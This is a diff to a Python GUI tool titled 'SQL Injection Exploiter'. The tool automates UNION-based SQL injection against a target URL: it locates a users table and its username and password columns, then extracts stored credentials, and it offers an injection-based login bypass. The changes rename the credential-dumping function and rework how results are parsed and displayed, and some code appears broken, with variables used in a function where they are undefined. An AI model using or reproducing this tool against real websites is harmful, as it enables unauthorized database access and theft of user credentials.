@@ -6,12 +6,13 @@ import re
 import tkinter as tk
 from tkinter import messagebox, StringVar
 import difflib
-import diff
+from diff import difference
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 diff = difflib.HtmlDiff()
+
 
 
 def perform_request(url, sql_payload, method, post_data):
@@ -155,19 +156,15 @@ def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,strin
     password_column = soup.find(text=re.compile('.*password.*'))
     return username_column, password_column
 
-def exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
+def exploit_sqli_user_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
     # sql_payload = "' UNION select CONCAT(%s, '~', %s)sfrom %s--" % (username_column, password_column, users_table)
     sql_payload = generate_sql_payload(num_col,string_column,"all",users_table)
     res = perform_request(url, sql_payload, method, post_data)
     res1 = requests.get(url)
     soup = BeautifulSoup(res.text, 'html.parser')
     soup2 = BeautifulSoup(res1.text, 'html.parser')
-    # output = difference(soup, soup2)
-
-    tilde_values = [str(tag) for tag in soup.find_all(lambda tag: '~' in tag.text)]
-    for value in tilde_values:
-        print(value)
-    return tilde_values
+    output = difference(str(soup), str(soup2))
+    return output
 def main():
     def execute_sql_injection():
         try:
@@ -183,36 +180,42 @@ def main():
         if method == 'POST':
             data = post_data_entry.get() if method == 'POST' else None
             post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
-        if try_login_option.get():
-            login_successful = try_login(url, method, post_data)
-            if login_successful[0]:
-                result_text.insert(tk.END, "[+] Login Successful!\n")
-                result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
-            else:
-                result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
-                return
 
-        print("Looking for the users table...")
-        if method == 'GET':
-            users_table,num_col,string_column = exploit_sqli_users_table(url, method)
-        elif method == 'POST':
-            users_table,num_col,string_column = exploit_sqli_users_table(url, method,post_data)
-        if users_table:
-            result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
-            username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
-            if username_column and password_column:
-                result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
-                result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
-
-                admin_password = exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method, post_data)
-                if admin_password:
-                    result_text.insert(tk.END, "[+] The administrator password is: %s\n" % admin_password)
+            if try_login_option.get():
+                login_successful = try_login(url, method, post_data)
+                if login_successful[0]:
+                    result_text.insert(tk.END, "[+] Login Successful!\n")
+                    result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
                 else:
-                    result_text.insert(tk.END, "Did not find the administrator password\n")
+                    result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
+                    return
+                
             else:
-                result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
-        else:
-            result_text.insert(tk.END, "Did not find a users table.\n")
+                result_text.insert(tk.END, "[-] Please select try login option.\n")
+                return
+        elif method == "GET":
+            print("Looking for the users table...")
+            users_table,num_col,string_column = exploit_sqli_users_table(url, method)
+            
+            if users_table:
+                result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
+                username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
+                if username_column and password_column:
+                    result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
+                    result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
+
+                    admin_password = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
+                    if admin_password:
+                        result_text.insert(tk.END, "[+] The username and password are as below: \n")
+                        for value in admin_password:
+                            result_text.insert(tk.END, "[+] %s\n" % value)
+
+                    else:
+                        result_text.insert(tk.END, "Did not find the administrator password\n")
+                else:
+                    result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
+            else:
+                result_text.insert(tk.END, "Did not find a users table.\n")
 
     root = tk.Tk()
     root.title("SQL Injection Exploiter")
